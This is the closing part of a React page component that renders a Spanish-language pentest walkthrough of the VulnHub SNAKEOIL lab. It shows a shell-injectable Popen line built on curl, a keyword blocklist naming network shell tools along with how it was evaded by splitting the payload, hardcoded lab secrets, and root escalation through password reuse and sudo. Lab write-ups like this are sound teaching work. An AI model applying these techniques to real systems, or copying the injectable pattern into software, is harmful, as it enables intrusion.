                una pseudo-terminal real, en vez de ser una shell "cruda" como
                la que entrega una reverse shell básica. La salida confirmó el
                acceso como <strong>patrick</strong>, ubicado en{" "}
                <code>/home/patrick/flask_blog</code>.
              </p>
            </div>
            <EvidenceGrid
              items={evidenceGroups.postExploitation.slice(0, 2)}
              start={32}
            />
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Se listó el contenido del directorio con <code>ls -la</code>,
                encontrando entre otros archivos <code>app.py</code>,{" "}
                <code>database.db</code>, <code>app.db</code>,{" "}
                <code>requirements.txt</code> y el propio <code>rev.sh</code> ya
                descargado. La lectura de <code>app.py</code> con{" "}
                <code>cat</code> reveló la configuración de la aplicación,
                incluyendo dos contraseñas hardcodeadas:
              </p>
            </div>
            <CodeBlock>{`app.config['SECRET_KEY'] = 'snakeoilisnotgoodforcorporations'
app.config['JWT_SECRET_KEY'] = 'NOreasonableDOUBTthisPASSWORDisGOOD'`}</CodeBlock>
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                El código también reveló la implementación exacta del endpoint{" "}
                <code>/run</code>, confirmando formalmente la vulnerabilidad de
                Command Injection que se venía sospechando desde las pruebas
                manuales:
              </p>
            </div>
            <CodeBlock>{`proc = Popen("/usr/bin/curl " + req_json["url"] + " > output.txt", stdout=PIPE, stderr=PIPE, shell=True)`}</CodeBlock>
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                El parámetro <code>url</code> se concatena directamente a un
                comando de shell (<code>shell=True</code>), sin sanitización
                alguna. Antes de esta línea, el código incluye una serie de
                validaciones que bloquean palabras como "bash", "python",
                "/dev/tcp", "nc", "mkfifo" y "php", lo cual explica el
                comportamiento observado durante la explotación: el payload
                directo fue bloqueado por contener "bash", y fue necesario
                dividir el ataque en pasos que evitaran esas palabras
                específicas.
              </p>
            </div>
            <EvidenceGrid
              items={evidenceGroups.postExploitation.slice(2)}
              start={34}
            />
          </ActivitySection>

          <ActivitySection
            id="escalada"
            number="11"
            title="Escalada de privilegios"
          >
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Con las dos contraseñas encontradas en <code>app.py</code>, se
                intentó escalar directamente a <strong>root</strong>, sin éxito
                con ninguna de las dos. Se probaron entonces las mismas
                contraseñas contra el propio usuario <strong>patrick</strong>:
                la primera también falló, pero{" "}
                <code>NOreasonableDOUBTthisPASSWORDisGOOD</code> resultó ser su
                contraseña real a nivel de sistema operativo, aunque no la de
                root, un caso de <strong>reutilización de contraseñas</strong>{" "}
                entre la aplicación web y las cuentas del sistema.
              </p>
            </div>
            <EvidenceGrid
              items={evidenceGroups.escalation.slice(0, 1)}
              start={36}
            />
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Con la contraseña de patrick confirmada, se investigaron sus
                permisos de sudo con <code>sudo -l</code>, que lista qué
                comandos puede ejecutar el usuario actual mediante sudo. La
                línea <code>(ALL : ALL) ALL</code> indicó que patrick puede
                ejecutar cualquier comando, como cualquier usuario, incluido
                root, una configuración de sudo excesivamente permisiva.
              </p>
            </div>
            <EvidenceGrid
              items={evidenceGroups.escalation.slice(1, 2)}
              start={37}
            />
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Aprovechando esto, se escaló directamente a root con{" "}
                <code>sudo su</code>. El prompt cambió a{" "}
                <code>root@SNAKEOIL:/home/patrick/flask_blog#</code>,
                confirmando el acceso como root.
              </p>
            </div>
            <EvidenceGrid
              items={evidenceGroups.escalation.slice(2, 3)}
              start={38}
            />
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Ya con privilegios de root, se realizó una breve exploración del
                sistema, incluyendo el directorio home de patrick. Dentro de él
                se encontró un archivo <code>local.txt</code> con el mensaje
                "Local shell access obtained!", confirmando el acceso local
                logrado hasta ese punto, previo a la verificación final.
                Finalmente, se confirmó el acceso total al sistema y se leyó la
                bandera de finalización en <code>/root/proof.txt</code>,
                confirmando la explotación completa de la máquina SNAKEOIL,
                desde el reconocimiento inicial hasta la obtención de
                privilegios de administrador.
              </p>
            </div>
            <EvidenceGrid
              items={evidenceGroups.escalation.slice(3)}
              start={39}
            />
          </ActivitySection>

          <ActivitySection id="conclusion" number="12" title="Conclusión">
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Este proyecto permitió aplicar de forma práctica la metodología
                de pentesting siguiendo cada una de sus fases: Descubrimiento,
                Escaneo, Enumeración, Análisis, Explotación, Escalada de
                Privilegios y Verificación, sobre la máquina virtual SNAKEOIL de
                VulnHub.
              </p>
              <p>
                El proceso evidenció cómo distintas vulnerabilidades,
                individualmente menores, pueden encadenarse para comprometer un
                sistema por completo. La enumeración inicial con Gobuster reveló
                endpoints ocultos que no eran accesibles desde la navegación
                normal de la aplicación, entre ellos <code>/users</code>, que
                expuso información sensible sin ningún control de autenticación.
                Aunque el hash de la contraseña encontrada resultó resistente a
                fuerza bruta, la ausencia de restricciones en el endpoint{" "}
                <code>/registration</code> permitió sortear por completo la
                necesidad de credenciales válidas, mediante la creación de una
                cuenta propia.
              </p>
              <p>
                A partir de ahí, la investigación del endpoint <code>/run</code>{" "}
                reveló una vulnerabilidad de inyección de comandos, confirmada
                posteriormente al inspeccionar el código fuente de la aplicación
                (<code>app.py</code>), donde se identificó que el parámetro{" "}
                <code>url</code> se concatenaba directamente a un comando de
                shell sin ninguna sanitización. El filtro de palabras
                implementado como medida de mitigación resultó insuficiente, ya
                que fue posible evadirlo dividiendo el ataque en múltiples
                peticiones simples, cada una de las cuales por sí sola no
                activaba ninguna de las reglas de bloqueo.
              </p>
              <p>
                Una vez obtenido acceso al sistema como el usuario{" "}
                <em>patrick</em>, la lectura del código fuente reveló dos
                contraseñas hardcodeadas en la configuración de la aplicación.
                Si bien ninguna de ellas correspondía a la contraseña de root,
                una de ellas coincidía con la contraseña del propio usuario del
                sistema operativo, un caso de{" "}
                <strong>reutilización de contraseñas</strong> entre la
                aplicación web y las cuentas del sistema. Finalmente, una
                configuración de sudo excesivamente permisiva (
                <code>(ALL : ALL) ALL</code>) permitió escalar privilegios a
                root sin mayor dificultad, culminando con la verificación
                exitosa del acceso total al sistema.
              </p>
              <p>
                En conjunto, la explotación de SNAKEOIL ilustra fallas comunes
                en el desarrollo de aplicaciones web reales: exposición de
                información sensible sin control de acceso, validación de
                entradas insuficiente en funcionalidades administrativas o de
                depuración, almacenamiento de credenciales directamente en el
                código fuente, y configuraciones de privilegios de sistema
                demasiado laxas. Cada una de estas fallas, de forma aislada,
                pudo no representar un riesgo crítico; sin embargo, combinadas,
                permitieron una escalada completa desde un acceso anónimo hasta
                el control total del servidor. Esto refuerza la importancia de
                aplicar el principio de <strong>defensa en profundidad</strong>,
                donde ningún componente del sistema dependa de una única medida
                de seguridad para su protección.
              </p>
            </div>
          </ActivitySection>

          <ActivitySection id="recursos" number="13" title="Recursos">
            <div className="grid gap-8">
              <div>
                <div className="aspect-video w-full overflow-hidden border border-border bg-surface">
                  <iframe
                    className="h-full w-full"
                    src="https://www.youtube.com/embed/6eKXOLh9rqI"
                    title="Demostración en video: De la teoría a la práctica — SnakeOil"
                    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
                    allowFullScreen
                  />
                </div>
                <p className="mt-3 text-sm leading-6 text-muted">
                  Demostración en video del walkthrough completo sobre la
                  máquina SnakeOil.
                </p>
              </div>

              <ResourceLink
                href={resourceBase + "/184346_project_p1.pdf"}
                download="184346_project_p1.pdf"
                type="PDF"
                title="Informe completo"
                description="Documentación completa del proyecto, con todas las evidencias, el análisis técnico y la conclusión."
              />
            </div>
          </ActivitySection>
        </div>
      </div>
    </article>
  );
}

export default Project01;
